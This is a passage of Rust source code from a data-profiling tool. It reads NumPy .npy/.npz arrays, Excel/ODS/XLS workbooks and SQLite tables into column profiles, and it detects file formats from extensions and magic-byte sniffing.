                        f64::from_be_bytes(b)
                    } else {
                        f64::from_le_bytes(b)
                    }
                    .to_string()
                }
                _ => npy_hex(bytes), // f16/f128 - rare, not worth a half-precision dependency
            },
            TypeChar::ByteStr => {
                let trimmed = bytes.split(|&b| b == 0).next().unwrap_or(bytes);
                String::from_utf8_lossy(trimmed).into_owned()
            }
            TypeChar::UnicodeStr => {
                let mut s = String::new();
                for chunk in bytes.chunks_exact(4) {
                    let code = npy_read_uint(chunk, big_endian).unwrap_or(0) as u32;
                    if code == 0 {
                        break; // right-zero-padded, like ByteStr
                    }
                    if let Some(c) = char::from_u32(code) {
                        s.push(c);
                    }
                }
                s
            }
            // Complex, Object (pickled - caught earlier via uses_pickled_array),
            // RawData: hex is always safe.
            _ => npy_hex(bytes),
        }
    }

    fn npy_value_to_string(dtype: &DType, bytes: &[u8]) -> String {
        match dtype {
            DType::Plain(ty) => npy_scalar_to_string(ty, bytes),
            DType::Array(n, inner) => {
                let Some(elem_size) = inner.num_bytes() else {
                    return npy_hex(bytes);
                };
                (0..*n as usize)
                    .filter_map(|i| bytes.get(i * elem_size..(i + 1) * elem_size))
                    .map(|chunk| npy_value_to_string(inner, chunk))
                    .collect::<Vec<_>>()
                    .join(";")
            }
            DType::Record(_) => npy_hex(bytes), // a field nested inside a field - rare
        }
    }

    /// The declared numpy dtype, mapped to this tool's type labels - this is
    /// `current_type`, i.e. what the format *says* it is (mirrors
    /// `arrow_type_label` for Parquet/Arrow IPC). `profile_column` still
    /// independently re-derives `ideal_type` from the stringified values
    /// regardless of this label, same as every other format.
    fn npy_type_label(dtype: &DType) -> String {
        match dtype {
            DType::Plain(ty) => match ty.type_char {
                TypeChar::Bool => "bool".to_string(),
                TypeChar::Int | TypeChar::Uint => "i64".to_string(),
                TypeChar::Float => "f64".to_string(),
                TypeChar::ByteStr | TypeChar::UnicodeStr => "String".to_string(),
                TypeChar::TimeDelta | TypeChar::DateTime => "Timestamp".to_string(),
                TypeChar::Complex => "Complex".to_string(),
                TypeChar::RawData => "Bytes".to_string(),
                TypeChar::Object => "Object".to_string(),
            },
            DType::Array(_, inner) => format!("Vec<{}>", npy_type_label(inner)),
            DType::Record(_) => "Struct".to_string(),
        }
    }

    /// Reads one already-parsed `.npy` header plus its data stream (a
    /// standalone file, or one array inside a `.npz` archive - the two
    /// share this same core). A structured dtype gives one column per
    /// field; a plain dtype gets positional `col_0..col_N` columns for a
    /// 2D array, or a single `value` column for 1D.
    fn columns_from_npy_reader<R: std::io::Read>(
        header: NpyHeader,
        mut reader: R,
        nrows: Option<usize>,
        n_samples: usize,
    ) -> Result<Vec<ColumnProfile>> {
        let NpyHeader {
            dtype,
            shape,
            order,
        } = header;
        if dtype.uses_pickled_array() {
            bail!(
                "this array uses numpy's pickled 'object' dtype, which isn't a fixed byte layout \
                 this tool can read - re-save it with a concrete dtype"
            );
        }

        let fields: Vec<Field> = match &dtype {
            DType::Record(fields) => fields.clone(),
            other => vec![Field {
                name: "value".to_string(),
                dtype: other.clone(),
            }],
        };
        let is_record = matches!(dtype, DType::Record(_));

        // A plain (unnamed) dtype with a 2D shape gets one positional column per
        // trailing-axis element instead of a single "value" column - the closest
        // honest equivalent of a headerless CSV's columns. Anything with more
        // axes than that has no natural row/column reading, so it's a clear
        // error instead of silently flattening or guessing.
        let n_cols = if is_record {
            1
        } else {
            match shape.len() {
                0 | 1 => 1,
                2 => usize::try_from(shape[1]).context("array width overflows usize")?,
                n => bail!(
                    "a {n}-dimensional plain (non-structured) array has no natural row/column \
                     reading - only 1D, 2D, or a structured (record) dtype are supported"
                ),
            }
        };
        let n_rows = usize::try_from(shape.first().copied().unwrap_or(1))
            .context("array length overflows usize")?;

        let field_sizes: Vec<usize> = fields
            .iter()
            .map(|f| {
                f.dtype
                    .num_bytes()
                    .with_context(|| format!("field '{}' has no fixed byte size", f.name))
            })
            .collect::<Result<_>>()?;

        let mut columns: Vec<Vec<String>> = if is_record {
            vec![Vec::new(); fields.len()]
        } else {
            vec![Vec::new(); n_cols]
        };
        let rows_to_read = nrows.map_or(n_rows, |limit| limit.min(n_rows));

        if is_record {
            // A structured array's records are always laid out contiguously one
            // after another (there's no "order" concept for records), so this
            // can stream one record at a time.
            let record_size: usize = field_sizes.iter().sum();
            let mut buf = vec![0u8; record_size];
            for row in 0..rows_to_read {
                reader
                    .read_exact(&mut buf)
                    .with_context(|| format!("failed reading row {row}"))?;
                let mut offset = 0;
                for (col_idx, (field, size)) in fields.iter().zip(&field_sizes).enumerate() {
                    columns[col_idx].push(npy_value_to_string(
                        &field.dtype,
                        &buf[offset..offset + size],
                    ));
                    offset += size;
                }
            }
        } else {
            // A plain array has no such guarantee - in particular, Fortran
            // (column-major) order means a single row's elements are scattered
            // stride-n_rows apart through the whole file, not contiguous - so
            // this reads every element up front and computes each one's flat
            // index explicitly rather than trying to stream row-sized chunks.
            let elem_size = field_sizes[0];
            let total_elems = n_rows * n_cols;
            let mut buf = vec![0u8; total_elems * elem_size];
            reader.read_exact(&mut buf).with_context(|| {
                format!("failed reading the array body ({total_elems} elements)")
            })?;
            for row in 0..rows_to_read {
                for (col_idx, column) in columns.iter_mut().enumerate() {
                    let flat_index = match order {
                        Order::C => row * n_cols + col_idx,
                        Order::Fortran => col_idx * n_rows + row,
                    };
                    let start = flat_index * elem_size;
                    column.push(npy_value_to_string(
                        &fields[0].dtype,
                        &buf[start..start + elem_size],
                    ));
                }
            }
        }

        let names: Vec<String> = if is_record {
            fields.iter().map(|f| f.name.clone()).collect()
        } else if n_cols == 1 {
            vec!["value".to_string()]
        } else {
            (0..n_cols).map(|i| format!("col_{i}")).collect()
        };
        let current_types: Vec<String> = if is_record {
            fields.iter().map(|f| npy_type_label(&f.dtype)).collect()
        } else {
            vec![npy_type_label(&fields[0].dtype); n_cols]
        };

        Ok(names
            .into_iter()
            .zip(current_types)
            .zip(columns)
            .map(|((name, current_type), values)| {
                let total = values.len();
                profile_column(
                    ColumnInput {
                        name,
                        current_type,
                        raw_values: values,
                        total,
                        skip_heuristics: false,
                    },
                    n_samples,
                )
            })
            .collect())
    }

    pub(crate) fn columns_from_npy(
        path: &Path,
        nrows: Option<usize>,
        n_samples: usize,
    ) -> Result<Vec<ColumnProfile>> {
        use std::fs::File;
        use std::io::BufReader;

        let file = File::open(path).with_context(|| format!("failed to open {path:?}"))?;
        let mut reader = BufReader::new(file);
        let header = read_npy_header(&mut reader)
            .with_context(|| format!("failed to parse {path:?} as a .npy file"))?;
        columns_from_npy_reader(header, reader, nrows, n_samples)
    }

    /// Numpy's own convention for which zip entries count as arrays inside
    /// an `.npz` (mirrors `npyz::npz::array_name_from_file_name`): case-
    /// sensitive `.npy` suffix, with an interior null byte (if any)
    /// truncating the name first.
    fn array_name_from_entry_name(entry_name: &str) -> Option<&str> {
        let name = match entry_name.find('\0') {
            Some(idx) => &entry_name[..idx],
            None => entry_name,
        };
        name.strip_suffix(".npy")
    }

    pub(crate) fn columns_from_npz(
        path: &Path,
        nrows: Option<usize>,
        n_samples: usize,
    ) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
        let archive = zip_support::ZipArchive::open(path)
            .with_context(|| format!("failed to open {path:?} as a .npz archive"))?;
        let names: Vec<(String, String)> = archive
            .names()
            .filter_map(|entry_name| {
                array_name_from_entry_name(entry_name)
                    .map(|array_name| (array_name.to_string(), entry_name.to_string()))
            })
            .collect();
        if names.is_empty() {
            bail!("no arrays found in {path:?}");
        }

        // Found via real-world testing (MNIST's own .npz - x_train/x_test are
        // genuine 3-D image arrays with no natural row/column reading, a real,
        // documented boundary, not a bug - but y_train/y_test in the *same
        // file* are perfectly ordinary 1-D label arrays): one array's shape or
        // dtype not being representable shouldn't cost every other array in
        // the same archive its own profile. Each array's read is caught
        // independently and disclosed on just that array's own "table" rather
        // than aborting the whole archive, the same principle already applied
        // to a single unconvertible nested column in Parquet/Arrow.
        let mut out = Vec::new();
        for (array_name, entry_name) in names {
            let read_result = archive
                .read(&entry_name)
                .with_context(|| format!("failed reading array '{array_name}' from {path:?}"))
                .and_then(|bytes| {
                    let mut cursor = std::io::Cursor::new(bytes);
                    let header = read_npy_header(&mut cursor).with_context(|| {
                        format!("failed to parse array '{array_name}' in {path:?} as .npy data")
                    })?;
                    columns_from_npy_reader(header, cursor, nrows, n_samples)
                });

            let profiles = match read_result {
                Ok(profiles) => profiles,
                Err(e) => vec![ColumnProfile {
                    name: "value".to_string(),
                    current_type: "unknown".to_string(),
                    ideal_type: "String".to_string(),
                    description: String::new(),
                    missing_pct: 0.0,
                    sample_values: Vec::new(),
                    notes: format!("array '{array_name}' could not be profiled: {e}"),
                }],
            };
            out.push((array_name, profiles));
        }
        Ok(out)
    }
} // mod npy_support

#[cfg(feature = "npy")]
fn columns_from_npy(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    npy_support::columns_from_npy(path, nrows, n_samples)
}

#[cfg(not(feature = "npy"))]
fn columns_from_npy(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    bail!(
        "NumPy support isn't compiled in - rebuild with `cargo build --release --features npy` (or --features full)"
    )
}

#[cfg(feature = "npy")]
fn columns_from_npz(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
    npy_support::columns_from_npz(path, nrows, n_samples)
}

#[cfg(not(feature = "npy"))]
fn columns_from_npz(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
    bail!(
        "NumPy support isn't compiled in - rebuild with `cargo build --release --features npy` (or --features full)"
    )
}
// --- Excel reader (opt-in via --features xlsx; also covers .xls/.xlsb/.ods) ---
// A workbook can hold multiple sheets, so - like SQLite - this returns one
// profile list per sheet rather than assuming a single implicit table.
// Empty sheets are skipped rather than erroring, the same way SQLite skips
// its own internal `sqlite_%` tables.

/// A cell Excel itself displays as a date/time (its own `Data::DateTime`
/// variant, backed by a raw numeric day-count serial - Excel's internal
/// storage for every date since 1900) used to be stringified as that raw
/// serial number (`"44652"`) rather than a date, because `calamine::Data`'s
/// own `Display` impl for that variant renders the *unresolved* serial,
/// not a calendar date - confirmed directly against the crate's own source
/// (`ExcelDateTime`'s `Display` is `write!(f, "{}", self.value)`), not
/// assumed. `.as_datetime()` (needs calamine's own `chrono` feature, now
/// enabled) resolves it correctly; only reached for cells calamine itself
/// already flags as a date/time (`is_datetime`/`is_datetime_iso`) rather
/// than every numeric cell, so a plain integer column is never
/// reinterpreted as a date. Time-of-day is dropped from the rendered
/// string only when it's exactly midnight - the same ambiguity a
/// date-only Excel format (`"d-mmm"`, no time component at all) and a
/// genuine midnight timestamp share, with no way to tell them apart from
/// the resolved value alone; the resulting ISO string still lands on the
/// exact same `DATE_FORMATS` entries any other date-shaped string would.
///
/// Test-only: calamine/chrono are dev-dependencies now (see Cargo.toml
/// and CLAUDE.md's Dependency footprint section) - every format they
/// used to read at runtime has its own hand-rolled reader, so this
/// function's only remaining job is producing the "expected" side of the
/// `*_matches_calamine_output_exactly` cross-verification tests.
#[cfg(all(test, feature = "xlsx"))]
fn xlsx_cell_to_string(cell: &calamine::Data) -> String {
    use calamine::DataType as _;
    if (cell.is_datetime() || cell.is_datetime_iso())
        && let Some(dt) = cell.as_datetime()
    {
        return if dt.time() == chrono::NaiveTime::MIN {
            dt.date().format("%Y-%m-%d").to_string()
        } else {
            dt.format("%Y-%m-%dT%H:%M:%S").to_string()
        };
    }
    cell.to_string()
}

/// Dispatches to the hand-rolled OOXML/ODF/BIFF8/BIFF12 readers for
/// `.xlsx`/`.ods`/`.xls`/`.xlsb` respectively (see `xlsx_support` above
/// and CLAUDE.md's Dependency footprint section - each verified to match
/// calamine's own output exactly across every real fixture before its
/// dispatch was wired in; `.xlsb` additionally against a real file
/// calamine itself can't read at all, see `xlsb_parse_bundle_sh`'s own
/// doc comment). Nothing this feature reads at runtime touches calamine
/// anymore - it's a dev-dependency now, kept only as this project's own
/// cross-verification oracle in tests (see Cargo.toml).
///
/// Dispatches on the file's own *content*, not its extension - the same
/// "declared type is a hint, not the truth" principle this project
/// already applies to `sniff_format`'s own content-based detection, not
/// a new one invented here. `xl/workbook.xml` is xlsx's own signature
/// ZIP entry; `xl/workbook.bin` is xlsb's (the same OPC container, with
/// binary BIFF12 parts instead of XML - checked *after* the `.xlsx`
/// check specifically so it can never misfire on a real `.xlsx`, which
/// has no `.bin` parts at all); `content.xml` + `mimetype` is ODF's; a
/// "Workbook"/"Book" OLE2 stream is `.xls`'s. Anything else - not a ZIP
/// or OLE2 file at all, or one without any of these four signatures - is
/// a clear, disclosed error rather than a guess: by the time this
/// function runs, the file was already routed here as `InputFormat::Xlsx`
/// (by extension or `sniff_format`'s own OLE2-magic sniffing), so
/// reaching this point with none of the four signatures matching means
/// either a corrupted file or a genuinely different, unsupported
/// structure - not something worth silently misreading.
#[cfg(feature = "xlsx")]
fn columns_from_xlsx(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
    if let Ok(zip) = zip_support::ZipArchive::open(path) {
        let names: Vec<&str> = zip.names().collect();
        if names.contains(&"xl/workbook.xml") {
            return xlsx_support::columns_from_xlsx_ooxml(path, nrows, n_samples);
        }
        if names.contains(&"xl/workbook.bin") {
            return xlsx_support::columns_from_xlsb(path, nrows, n_samples);
        }
        if names.contains(&"content.xml") && names.contains(&"mimetype") {
            return xlsx_support::columns_from_ods(path, nrows, n_samples);
        }
    }
    if let Ok(cfb) = xlsx_support::CfbFile::open(path)
        && (cfb.has_stream("Workbook") || cfb.has_stream("Book"))
    {
        return xlsx_support::columns_from_xls(path, nrows, n_samples);
    }
    bail!(
        "{path:?} doesn't match a recognized .xlsx/.xlsb/.ods ZIP structure or .xls OLE2 \
         structure - if this is genuinely one of those formats, its internal layout doesn't \
         match what this reader expects (a corrupted file, or an .xlsb written by an unusual \
         tool, are the most likely causes)"
    )
}

#[cfg(all(test, feature = "xlsx"))]
fn columns_from_xlsx_calamine(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
    use calamine::{DataType as _, Reader, open_workbook_auto};

    let mut workbook =
        open_workbook_auto(path).with_context(|| format!("failed to open {path:?}"))?;
    let sheet_names = workbook.sheet_names().to_vec();
    if sheet_names.is_empty() {
        bail!("no sheets found in {path:?}");
    }

    let mut out = Vec::new();
    for sheet_name in sheet_names {
        let range = workbook
            .worksheet_range(&sheet_name)
            .with_context(|| format!("failed to read sheet '{sheet_name}' in {path:?}"))?;

        let mut rows = range.rows();
        let Some(header_row) = rows.next() else {
            continue; // empty sheet - no header row, contributes no table
        };
        let headers: Vec<String> = header_row.iter().map(|c| c.to_string()).collect();

        let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); headers.len()];
        for (i, row) in rows.enumerate() {
            if nrows.is_some_and(|limit| i >= limit) {
                break;
            }
            for (col_idx, col) in raw.iter_mut().enumerate() {
                let value = match row.get(col_idx) {
                    Some(cell) if !cell.is_empty() => Some(xlsx_cell_to_string(cell)),
                    _ => None,
                };
                col.push(value);
            }
        }

        let mut profiles = Vec::new();
        for (i, name) in headers.into_iter().enumerate() {
            let total = raw[i].len();
            let non_null: Vec<String> = raw[i].iter().filter_map(|v| v.clone()).collect();
            let current_type = if non_null.is_empty() {
                "String".to_string()
            } else {
                let refs: Vec<&str> = non_null.iter().map(|s| s.as_str()).collect();
                naive_current_type(&refs).to_string()
            };
            let col = ColumnInput {
                name,
                current_type,
                raw_values: non_null,
                total,
                skip_heuristics: false,
            };
            profiles.push(profile_column(col, n_samples));
        }
        out.push((sheet_name, profiles));
    }

    if out.is_empty() {
        bail!("no non-empty sheets found in {path:?}");
    }
    Ok(out)
}

#[cfg(not(feature = "xlsx"))]
fn columns_from_xlsx(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
    bail!(
        "Excel support isn't compiled in - rebuild with `cargo build --release --features xlsx` (or --features full)"
    )
}

// --- SQLite reader (opt-in via --features sqlite) ---
// A single file can hold multiple tables, so this returns one profile list
// per table rather than a flat column list. SQLite's dynamic typing means a
// column declared INTEGER can still hold TEXT rows (a real, well-known
// SQLite quirk) - Current Type is built from what's actually stored per
// value, not the declared column type, so that quirk surfaces as a "mixed"
// type exactly like an inconsistent JSON field would.

#[cfg(feature = "sqlite")]
fn describe_sql_kinds(counts: &HashMap<&'static str, usize>) -> String {
    if counts.len() == 1 {
        return (*counts.keys().next().unwrap()).to_string();
    }
    let mut parts: Vec<(&str, usize)> = counts.iter().map(|(k, c)| (*k, *c)).collect();
    parts.sort_by(|a, b| a.0.cmp(b.0));
    let inner = parts
        .iter()
        .map(|(label, count)| format!("{label}: {count}"))
        .collect::<Vec<_>>()
        .join(", ");
    format!("mixed({inner})")
}

#[cfg(feature = "sqlite")]
fn columns_from_sqlite(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
    use rusqlite::Connection;
    use rusqlite::types::ValueRef;

    let conn = Connection::open(path).with_context(|| format!("failed to open {path:?}"))?;
    let mut table_stmt = conn
        .prepare("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' ORDER BY name")
        .with_context(|| format!("failed to list tables in {path:?}"))?;
    let table_names: Vec<String> = table_stmt
        .query_map([], |row| row.get::<_, String>(0))
        .and_then(Iterator::collect)
        .with_context(|| format!("failed to list tables in {path:?}"))?;
    drop(table_stmt);

    if table_names.is_empty() {
        bail!("no user tables found in {path:?}");
    }

    let mut out = Vec::new();
    for table in table_names {
        let query = match nrows {
            Some(n) => format!("SELECT * FROM \"{table}\" LIMIT {n}"),
            None => format!("SELECT * FROM \"{table}\""),
        };
        let mut stmt = conn
            .prepare(&query)
            .with_context(|| format!("failed to query table '{table}' in {path:?}"))?;
        let col_names: Vec<String> = stmt.column_names().iter().map(|s| s.to_string()).collect();
        let n_cols = col_names.len();

        let mut raw: Vec<Vec<Option<String>>> = vec![Vec::new(); n_cols];
        let mut kind_counts: Vec<HashMap<&'static str, usize>> = vec![HashMap::new(); n_cols];

        let mut rows = stmt
            .query([])
            .with_context(|| format!("failed to query table '{table}' in {path:?}"))?;
        while let Some(row) = rows
            .next()
            .with_context(|| format!("failed reading a row from '{table}' in {path:?}"))?
        {
            for i in 0..n_cols {
                let value_ref = row.get_ref(i).with_context(|| {
                    format!("failed reading a value from '{table}' in {path:?}")
                })?;
                let value = match value_ref {
                    ValueRef::Null => None,
                    ValueRef::Integer(v) => {
                        *kind_counts[i].entry("i64").or_insert(0) += 1;
                        Some(v.to_string())
                    }
                    ValueRef::Real(v) => {
                        *kind_counts[i].entry("f64").or_insert(0) += 1;
                        Some(v.to_string())
                    }
                    ValueRef::Text(t) => {
                        *kind_counts[i].entry("String").or_insert(0) += 1;
                        Some(String::from_utf8_lossy(t).into_owned())
                    }
                    ValueRef::Blob(b) => {
                        *kind_counts[i].entry("Blob").or_insert(0) += 1;
                        Some(format!("<blob: {} bytes>", b.len()))
                    }
                };
                raw[i].push(value);
            }
        }

        let mut profiles = Vec::new();
        for (i, name) in col_names.into_iter().enumerate() {
            let non_null: Vec<String> = raw[i].iter().filter_map(|v| v.clone()).collect();
            let current_type = if kind_counts[i].is_empty() {
                "null".to_string()
            } else {
                describe_sql_kinds(&kind_counts[i])
            };
            let col = ColumnInput {
                name,
                current_type,
                raw_values: non_null,
                total: raw[i].len(),
                skip_heuristics: false,
            };
            profiles.push(profile_column(col, n_samples));
        }
        out.push((table, profiles));
    }
    Ok(out)
}

#[cfg(not(feature = "sqlite"))]
fn columns_from_sqlite(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<(String, Vec<ColumnProfile>)>> {
    bail!(
        "SQLite support isn't compiled in - rebuild with `cargo build --release --features sqlite` (or --features full)"
    )
}

// --- Format detection ---

enum InputFormat {
    Csv,
    Tsv,
    Json,
    Parquet,
    ArrowIpc,
    Avro,
    Xlsx,
    Sqlite,
    MsgPack,
    Toml,
    Yaml,
    Cbor,
    Ini,
    Xml,
    FixedWidth,
    Npy,
    Npz,
    CommonLog,
    CombinedLog,
    Syslog,
    Syslog5424,
    Dbase,
    Stata,
    Sas7bdat,
}

impl InputFormat {
    fn as_str(&self) -> &'static str {
        match self {
            InputFormat::Csv => "csv",
            InputFormat::Tsv => "tsv",
            InputFormat::Json => "json",
            InputFormat::Parquet => "parquet",
            InputFormat::ArrowIpc => "arrow_ipc",
            InputFormat::Avro => "avro",
            InputFormat::Xlsx => "xlsx",
            InputFormat::Sqlite => "sqlite",
            InputFormat::MsgPack => "msgpack",
            InputFormat::Toml => "toml",
            InputFormat::Yaml => "yaml",
            InputFormat::Cbor => "cbor",
            InputFormat::Ini => "ini",
            InputFormat::Xml => "xml",
            InputFormat::FixedWidth => "fixed_width",
            InputFormat::Npy => "npy",
            InputFormat::Npz => "npz",
            InputFormat::CommonLog => "common_log",
            InputFormat::CombinedLog => "combined_log",
            InputFormat::Syslog => "syslog",
            InputFormat::Syslog5424 => "syslog5424",
            InputFormat::Dbase => "dbase",
            InputFormat::Stata => "stata",
            InputFormat::Sas7bdat => "sas7bdat",
        }
    }
}

// --- Content-based format sniffing (the fallback detect_format reaches for
// when the extension is missing or unrecognized) ---

/// SAS7BDAT's own fixed 32-byte header magic, copied verbatim from the
/// `sas7bdat` crate's `probe.rs` (`SAS7BDAT_MAGIC_NUMBER`) rather than
/// reconstructed from memory - the same "verified against the source, not
/// assumed" discipline the rest of this file's heuristics already follow.
const SAS7BDAT_MAGIC: [u8; 32] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC2, 0xEA, 0x81, 0x60,
    0xB3, 0x14, 0x11, 0xCF, 0xBD, 0x92, 0x08, 0x00, 0x09, 0xC7, 0x31, 0x8C, 0x18, 0x1F, 0x10, 0x11,
];

/// How much of a file's head `sniff_format` reads looking for a magic
/// number or structural signature: enough to cover every fixed-offset
/// check below (SAS7BDAT's 32-byte magic is the longest single one) with
/// headroom for the zip-based substring search, which needs to see past a
/// spreadsheet's early metadata entries to reach a distinguishing path
/// like "xl/workbook.xml".
const SNIFF_HEAD_BYTES: u64 = 64 * 1024;

fn slice_contains(haystack: &[u8], needle: &[u8]) -> bool {
    haystack.windows(needle.len()).any(|w| w == needle)
}

/// Content-based format detection: the fallback `detect_format` reaches for
/// once the extension is missing or isn't one this tool recognizes. The
/// file extension is itself just a hint - the same "declared type is a
/// hint, not the truth" principle this tool already applies to every
/// column (see CLAUDE.md's design philosophy) - so a file with no
/// extension, or a generic one (`.dat`, `.bin`, a download with none at
/// all), doesn't have to fall back to a `--format`-demanding error if its
/// own bytes carry a real signal.
///
/// Deliberately conservative: only formats with a fixed magic number, or a
/// multi-field structural check strong enough to be confident rather than a
/// guess, are attempted here. CSV/TSV/TOML/YAML/INI have no such signal -
/// plain delimited or key-value text is genuinely ambiguous between them at
/// the byte level (the same kind of irreducible ambiguity this tool already
/// discloses rather than guesses at elsewhere, e.g. a dotted-quad value
/// valid as both IPv4 and a version string) - so those still need an
/// extension or `--format`. Fixed-width text and the four log formats are
/// skipped for the same reason they're already `--format`-only: no
/// delimiter or magic number distinguishes them from generic text either.
fn sniff_format(path: &Path) -> Option<InputFormat> {
    use std::io::{Read, Seek, SeekFrom};

    let mut file = fs::File::open(path).ok()?;
    let file_len = file.metadata().ok()?.len();
    let mut head = Vec::new();
    file.by_ref()
        .take(SNIFF_HEAD_BYTES)
        .read_to_end(&mut head)
        .ok()?;
    if head.is_empty() {
        return None;
    }

    // --- Fixed magic numbers - each verified against the reader crate's
    // own source rather than assumed.
    if head.starts_with(b"SQLite format 3\0") {
        return Some(InputFormat::Sqlite);
    }
    if head.starts_with(b"Obj\x01") {
        return Some(InputFormat::Avro);
    }
    if head.starts_with(b"ARROW1") {
        return Some(InputFormat::ArrowIpc);
    }
    if head.starts_with(b"\x93NUMPY") {
        return Some(InputFormat::Npy);
    }
    if head.len() >= 32 && head[..32] == SAS7BDAT_MAGIC[..] {
        return Some(InputFormat::Sas7bdat);
    }
    if head.starts_with(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]) {
        // OLE2/Compound File Binary magic - the pre-2007 .xls container
        // (also .doc/.ppt, but this tool reads no other format that magic
        // could mean, so there's no ambiguity in practice).
        return Some(InputFormat::Xlsx);
    }
    if head.starts_with(b"PAR1") && file_len >= 8 {
        let mut tail = [0u8; 4];
        if file.seek(SeekFrom::End(-4)).is_ok() && file.read_exact(&mut tail).is_ok() {
            // "PAR1" is Parquet's normal footer magic, "PARE" marks an
            // encrypted footer - both are real, valid Parquet files per the
            // `parquet` crate's own writer (PARQUET_MAGIC /
            // PARQUET_MAGIC_ENCR_FOOTER in file/mod.rs).
            if &tail == b"PAR1" || &tail == b"PARE" {
                return Some(InputFormat::Parquet);
            }
        }
    }

    // --- Stata .dta: the modern XML-like container (release 117+) opens
    // with a literal ASCII tag. The older binary format (102-116) has no
    // fixed string at all, just a numeric release byte - so this combines
    // it with the byte-order byte that always follows (0, 1, or 2) into one
    // confident two-field check, the same "stack independent weak signals"
    // approach dBase's check below needs for the same reason.
    if head.starts_with(b"<stata_dta>") {
        return Some(InputFormat::Stata);
    }
    if head.len() >= 2 && (102..=116).contains(&head[0]) && head[1] <= 2 {
        return Some(InputFormat::Stata);
    }

    // --- dBase: also no fixed magic string, just a version byte - on its
    // own, nowhere near unique (roughly a dozen values out of 256). Paired
    // with the header's other fixed-offset fields (a valid month/day in the
    // "last updated" date, and a header/record length that are internally
    // consistent with a real dBase file) the combined false-positive rate
    // is negligible - verified against the `dbase` crate's own header
    // layout (`header.rs`'s `Header::read_from` and `Version::from`) rather
    // than assumed.
    if let Some(h) = head.get(0..12) {
        let version_known = matches!(
            h[0],
            0x02 | 0x03 | 0x83 | 0x30..=0x32 | 0x8b | 0xcb | 0x43 | 0x63 | 0xfb | 0xf5
        );
        let month = h[2];
        let day = h[3];
        let header_len = u16::from_le_bytes([h[8], h[9]]);
        let record_len = u16::from_le_bytes([h[10], h[11]]);
        if version_known
            && (1..=12).contains(&month)
            && (1..=31).contains(&day)
            && header_len >= 32
            && record_len >= 1
        {
            return Some(InputFormat::Dbase);
        }
    }

    // --- Zip-based formats (xlsx/xlsb/ods, npz) share the same outer
    // magic, so telling them apart needs a peek at what's actually packed
    // inside. A zip's local file header stores each entry's filename as
    // plain, uncompressed ASCII, so a substring search over the same head
    // buffer - no real zip/central-directory parsing needed - reliably
    // tells them apart: OOXML spreadsheets always carry an "xl/" entry
    // (verified against this project's own committed .xlsx fixtures), an
    // ODF spreadsheet's first entry is a literal "mimetype" file naming its
    // content type, and every entry in an .npz archive is named
    // "<array-name>.npy".
    if head.starts_with(b"PK\x03\x04") {
        if slice_contains(&head, b"application/vnd.oasis.opendocument.spreadsheet") {
            return Some(InputFormat::Xlsx);
        }
        if slice_contains(&head, b"xl/") {
            return Some(InputFormat::Xlsx);
        }
        if slice_contains(&head, b".npy") {
            return Some(InputFormat::Npz);
        }
    }

    // --- Text formats: only the two with an unambiguous leading character
    // are attempted. CSV/TSV/TOML/YAML/INI are left alone (see the doc
    // comment above) - a leading '{'/'[' is JSON's own grammar, not a
    // guess (a YAML flow-style document could in principle also open this
    // way, but that's vanishingly rare as an entire real-world file rather
    // than a value inside one - the same disclosed-not-hidden tradeoff as
    // the geographic-coordinate check). XML requires the character right
    // after '<' to be a valid tag-name start (an ASCII letter, '_', or the
    // '?' of an XML declaration) specifically so this can't collide with
    // an RFC 3164 syslog line, which also opens with '<' but is followed
    // by a PRI digit ("<34>Oct 11 ...") - a digit is never a legal XML
    // tag-name start.
    let mut idx = 0;
    while idx < head.len() && head[idx].is_ascii_whitespace() {
        idx += 1;
    }
    if let Some(&first) = head.get(idx) {
        if first == b'{' || first == b'[' {
            return Some(InputFormat::Json);
        }
        if first == b'<'
            && let Some(&next) = head.get(idx + 1)
            && (next.is_ascii_alphabetic() || next == b'_' || next == b'?')
        {
            return Some(InputFormat::Xml);
        }
    }

    None
}

/// `logical_path` drives extension-based detection (as before) and its
/// error messages; `read_path` is the file's real, already-decompressed
/// bytes (see `decompress_if_needed` - for a plain, uncompressed input the
/// two are the same path) that `sniff_format` reads from when the
/// extension alone isn't enough.
fn detect_format(
    read_path: &Path,
    logical_path: &Path,
    override_fmt: &Option<String>,
) -> Result<InputFormat> {
    if let Some(f) = override_fmt {
        return match f.to_lowercase().as_str() {
            "csv" => Ok(InputFormat::Csv),
            "tsv" => Ok(InputFormat::Tsv),
            "json" | "jsonl" | "ndjson" => Ok(InputFormat::Json),
            "parquet" => Ok(InputFormat::Parquet),
            "arrow" | "feather" | "ipc" => Ok(InputFormat::ArrowIpc),
            "avro" => Ok(InputFormat::Avro),
            "xlsx" | "xls" | "xlsb" | "ods" => Ok(InputFormat::Xlsx),
            "sqlite" | "db" => Ok(InputFormat::Sqlite),
            "msgpack" | "mp" => Ok(InputFormat::MsgPack),
            "toml" => Ok(InputFormat::Toml),
            "yaml" | "yml" => Ok(InputFormat::Yaml),
            "cbor" => Ok(InputFormat::Cbor),
            "ini" => Ok(InputFormat::Ini),
            "xml" => Ok(InputFormat::Xml),
            "fixed-width" | "fixed_width" | "fwf" => Ok(InputFormat::FixedWidth),
            "npy" => Ok(InputFormat::Npy),
            "npz" => Ok(InputFormat::Npz),
